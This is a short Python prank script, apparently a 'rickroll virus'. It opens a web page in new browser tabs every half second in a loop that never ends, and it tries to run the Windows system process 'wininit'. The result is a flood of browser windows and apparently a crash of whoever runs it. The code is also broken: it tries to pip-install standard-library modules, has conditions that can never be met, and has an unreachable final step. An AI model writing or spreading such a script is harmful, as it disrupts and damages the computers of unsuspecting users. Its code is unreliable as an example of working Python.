try:
    import webbrowser
    import os
    from time import sleep
    import tkinter as tk
    from tkinter import messagebox, simpledialog
    from random import randrange
except:
    print("uh oh! We ran into an error, try installing the modules")
    a = input("would you like to install the nessary modules (Y, n)? ")
    if a == ('Y'):
        import os
        os.system("pip install tkinter")
        os.system("pip install time")
        os.system("pip install webbrowser")
    elif a == ("n"):
        exit()
root = tk.Tk()
root.withdraw()
b = (randrange(69, 69420))
c = int(b)
while c > 0:
    webbrowser.open_new("https://sites.google.com/view/rickrollvirusmainpage/home")
    if c == (50):
        webbrowser.open_new("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        webbrowser.open_new("https://sites.google.com/view/rickrollvirusmainpage/home")
    sleep(0.5)
if c == (0):
    os.system("wininit")

